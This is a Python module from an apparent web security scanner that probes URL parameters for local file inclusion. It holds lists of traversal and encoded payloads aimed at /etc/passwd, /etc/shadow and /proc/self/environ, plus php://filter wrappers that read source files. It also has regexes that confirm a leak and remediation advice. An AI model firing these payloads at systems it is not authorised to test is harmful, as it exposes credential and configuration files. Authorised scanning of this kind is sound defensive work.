"""
LFI / Path Traversal Scanner

FALSE-POSITIVE ELIMINATION STRATEGY
====================================
PROBLEM: Checking if "root:" or "/bin/bash" appears in a response is too loose.
 Normal web pages include CSS class names, config snippets, documentation
 text, or error messages that contain these strings.

CORRECT APPROACH:
 1. Match FULL line patterns from real files (e.g. full /etc/passwd entry).
 2. Require multiple indicator lines OR the complete file signature.
 3. For PHP wrappers: base64-decode the output and verify it contains PHP code.
 4. Baseline check: the indicator must NOT appear in a clean (non-injected) response.
 5. Use a unique random suffix in traversal payloads to catch length-based FPs.
"""
from __future__ import annotations
import asyncio
import base64
import re
import urllib.parse
from typing import Any

from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

# ---------------------------------------------------------------------------
# Strict file content signatures
# ---------------------------------------------------------------------------

# /etc/passwd — full UNIX password entry format
_RE_PASSWD_FULL = re.compile(
 r'(?:root|daemon|bin|sys|nobody):x:\d+:\d+:[^:]*:/[^:]*:/(?:bin|usr/bin|usr/sbin)/\w+',
 re.MULTILINE,
)

# /etc/shadow — hashed password entries
_RE_SHADOW = re.compile(
 r'root:[$!*][^:]*:\d+:\d+:',
 re.MULTILINE,
)

# Windows win.ini — unique structure
_RE_WIN_INI = re.compile(
 r'\[extensions\].*?(?:txt|doc|xls)=',
 re.IGNORECASE | re.DOTALL,
)

# Windows system32 hosts file
_RE_WIN_HOSTS = re.compile(
 r'#\s*Copyright.*?Microsoft.*?127\.0\.0\.1\s+localhost',
 re.IGNORECASE | re.DOTALL,
)

# /proc/self/environ — HTTP server environment variables
_RE_PROC_ENVIRON = re.compile(
 r'(?:HTTP_HOST|DOCUMENT_ROOT|SERVER_SOFTWARE|GATEWAY_INTERFACE)=[^\x00]+',
 re.IGNORECASE,
)

# /proc/version — Linux kernel version string
_RE_PROC_VERSION = re.compile(
 r'Linux version \d+\.\d+\.\d+.*?(?:GCC|gcc)',
 re.IGNORECASE,
)

# PHP source via php://filter — after base64 decoding
_RE_PHP_SOURCE = re.compile(
 r'<\?php\s+(?:\/\*|\/\/|echo|require|include|define|\$)',
 re.IGNORECASE,
)

# Apache/Nginx configuration
_RE_APACHE_CONF = re.compile(
 r'<VirtualHost\s+\*:\d+>',
 re.IGNORECASE,
)

FILE_SIGNATURES: list[tuple[re.Pattern, str, str]] = [
 (_RE_PASSWD_FULL, "/etc/passwd content confirmed",  "high"),
 (_RE_SHADOW,  "/etc/shadow content confirmed",  "critical"),
 (_RE_WIN_INI,  "Windows win.ini content confirmed", "high"),
 (_RE_WIN_HOSTS,  "Windows hosts file confirmed",  "medium"),
 (_RE_PROC_ENVIRON, "/proc/self/environ confirmed",  "high"),
 (_RE_PROC_VERSION, "/proc/version confirmed",    "medium"),
 (_RE_APACHE_CONF, "Apache config file confirmed",  "high"),
]


def _check_lfi_response(text: str) -> tuple[bool, str, str]:
 """Return (confirmed, description, severity) for LFI evidence."""
 for pattern, description, severity in FILE_SIGNATURES:
  m = pattern.search(text)
  if m:
   snippet = text[max(0, m.start() - 10): m.end() + 50].strip()
   return True, f"{description}\nSnippet: {snippet[:200]}", severity
 return False, "", ""


def _check_php_filter_response(text: str) -> tuple[bool, str]:
 """
 Check if response contains a base64-encoded PHP file.
 Extract all long base64 blobs and try to decode them.
 """
 # Look for base64 blobs (40+ chars of base64 alphabet)
 b64_re = re.compile(r'[A-Za-z0-9+/]{40,}={0,2}')
 for match in b64_re.finditer(text):
  blob = match.group(0)
  # Pad if needed
  pad = (4 - len(blob) % 4) % 4
  try:
   decoded = base64.b64decode(blob + "=" * pad).decode("utf-8", errors="ignore")
   if _RE_PHP_SOURCE.search(decoded):
    snippet = decoded[:150].replace("\n", " ")
    return True, f"PHP source via php://filter: {snippet}"
   if _RE_PASSWD_FULL.search(decoded):
    return True, f"/etc/passwd via php://filter: {decoded[:150]}"
  except Exception:
   continue
 return False, ""


# ---------------------------------------------------------------------------
# Payload sets
# ---------------------------------------------------------------------------

UNIX_TRAVERSAL_PAYLOADS = [
 "../../etc/passwd",
 "../../../etc/passwd",
 "../../../../etc/passwd",
 "../../../../../etc/passwd",
 "../../../../../../etc/passwd",
 "../../../../../../../etc/passwd",
 "../../../../../../../../../../etc/passwd",
 "/etc/passwd",
 "/etc/shadow",
 "/proc/self/environ",
 "/proc/version",
 "/proc/self/cmdline",
]

UNIX_ENCODED_PAYLOADS = [
 "..%2f..%2fetc%2fpasswd",
 "..%252f..%252fetc%252fpasswd",
 "..%c0%af..%c0%afetc%c0%afpasswd",
 "..%c1%9c..%c1%9cetc%c1%9cpasswd",
 "....//....//....//etc/passwd",
 "..././..././..././etc/passwd",
 "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
 "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
 "..%2F..%2F..%2Fetc%2Fpasswd",
]

WINDOWS_TRAVERSAL_PAYLOADS = [
 "..\\..\\windows\\win.ini",
 "..\\..\\..\\windows\\win.ini",
 "C:\\windows\\win.ini",
 "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

PHP_WRAPPER_PAYLOADS = [
 "php://filter/convert.base64-encode/resource=index.php",
 "php://filter/read=convert.base64-encode/resource=/etc/passwd",
 "php://filter/convert.base64-encode/resource=../index.php",
 "php://filter/convert.base64-encode/resource=../../index.php",
 "php://filter/convert.base64-encode/resource=/etc/shadow",
]

# Parameters commonly used for file inclusion
LFI_PARAMS = [
 "file", "page", "path", "include", "template", "view",
 "doc", "document", "folder", "root", "dir", "content",
 "f", "p", "pg", "style", "pdf", "download", "read",
 "load", "show", "get", "data", "menu", "lang", "language",
 "layout", "module", "display", "section", "chapter",
]


async def _baseline_has_indicator(
 url: str,
 param: str,
 method: str,
 client: TalismanHTTPClient,
) -> tuple[bool, str]:
 """Check if any file signature appears in the clean baseline response."""
 try:
  if method == "GET":
   parsed = urllib.parse.urlparse(url)
   base_params = dict(urllib.parse.parse_qsl(parsed.query))
   base_params[param] = "home"
   test_url = parsed._replace(
    query=urllib.parse.urlencode(base_params)
   ).geturl()
   r = await client.get(test_url, timeout=8)
  else:
   r = await client.post(url, data={param: "home"}, timeout=8)

  confirmed, desc, _ = _check_lfi_response(r.text)
  return confirmed, desc
 except Exception:
  return False, ""


async def _test_lfi_param(
 url: str,
 param: str,
 client: TalismanHTTPClient,
) -> dict[str, Any] | None:
 parsed = urllib.parse.urlparse(url)
 base_params = dict(urllib.parse.parse_qsl(parsed.query))

 # Check baseline first to avoid FPs
 baseline_hit, _ = await _baseline_has_indicator(url, param, "GET", client)
 if baseline_hit:
  log.debug("lfi_baseline_collision", param=param)
  return None

 all_payloads = (
  UNIX_TRAVERSAL_PAYLOADS
  + UNIX_ENCODED_PAYLOADS
  + WINDOWS_TRAVERSAL_PAYLOADS
 )

 for payload in all_payloads:
  test_params = {**base_params, param: payload}
  test_url = parsed._replace(
   query=urllib.parse.urlencode(test_params)
  ).geturl()

  try:
   r = await client.get(test_url, timeout=10)

   if r.status_code not in (200, 206):
    continue

   confirmed, evidence, severity = _check_lfi_response(r.text)
   if confirmed:
    return {
     "param": param,
     "payload": payload,
     "technique": "direct",
     "severity": severity,
     "evidence": evidence,
     "request": f"GET {test_url} HTTP/1.1",
    }

  except Exception as e:
   log.debug("lfi_test", param=param, error=str(e)[:60])

 # PHP wrapper payloads
 for payload in PHP_WRAPPER_PAYLOADS:
  test_params = {**base_params, param: payload}
  test_url = parsed._replace(
   query=urllib.parse.urlencode(test_params)
  ).geturl()

  try:
   r = await client.get(test_url, timeout=10)

   if r.status_code not in (200, 206):
    continue

   # Try base64 decode to find PHP source
   found, evidence = _check_php_filter_response(r.text)
   if found:
    return {
     "param": param,
     "payload": payload,
     "technique": "php_filter",
     "severity": "high",
     "evidence": evidence,
     "request": f"GET {test_url} HTTP/1.1",
    }

  except Exception as e:
   log.debug("lfi_php_filter", param=param, error=str(e)[:60])

 return None


async def run(
 target: str,
 session: Any = None,
 scope: Any = None,
 rate_limiter: Any = None,
 proxy: str | None = None,
 waf_bypass: bool = False,
 **kwargs: Any,
) -> dict[str, Any]:
 url = target if "://" in target else f"https://{target}"
 console.print(
  f"\n[module][+] LFI / Path Traversal Scanner[/module] -> [target]{url}[/target]"
 )
 findings: list[dict[str, Any]] = []

 parsed = urllib.parse.urlparse(url)
 existing_params = list(dict(urllib.parse.parse_qsl(parsed.query)).keys())
 params = list(dict.fromkeys(existing_params + LFI_PARAMS))

 async with TalismanHTTPClient(proxy=proxy, timeout=15) as client:
  tasks = [_test_lfi_param(url, p, client) for p in params]
  results = await asyncio.gather(*tasks, return_exceptions=True)

  seen_params: set[str] = set()
  for result in results:
   if not isinstance(result, dict):
    continue
   if result["param"] in seen_params:
    continue
   seen_params.add(result["param"])

   severity = result.get("severity", "high")
   title = (
    f"LFI / Path Traversal — param '{result['param']}' "
    f"({result['technique']})"
   )
   print_finding(title, severity, url)
   findings.append(result)

   if session:
    await session.add_finding(
     target=url,
     module="lfi",
     vuln_type="lfi",
     severity=severity,
     confidence="confirmed",
     title=title,
     description=(
      f"Local File Inclusion via parameter '{result['param']}'. "
      f"Payload '{result['payload']}' caused the server to "
      f"include local file content in the response."
     ),
     request=result["request"],
     evidence=result["evidence"],
     reproduction=(
      f"GET {url}?"
      f"{result['param']}={urllib.parse.quote(result['payload'])}"
     ),
     remediation=(
      "1. Never use user input to construct file paths.\n"
      "2. Use a whitelist of allowed file names/paths.\n"
      "3. Resolve canonical paths and validate they are within "
      "the expected base directory.\n"
      "4. Disable dangerous PHP wrappers "
      "(allow_url_include=Off)."
     ),
     cvss_score=7.5,
     cwe="CWE-22",
    )

 console.print(
  f" Found {len(findings)} confirmed LFI vulnerabilities"
 )
 return {"target": url, "findings": findings, "count": len(findings)}
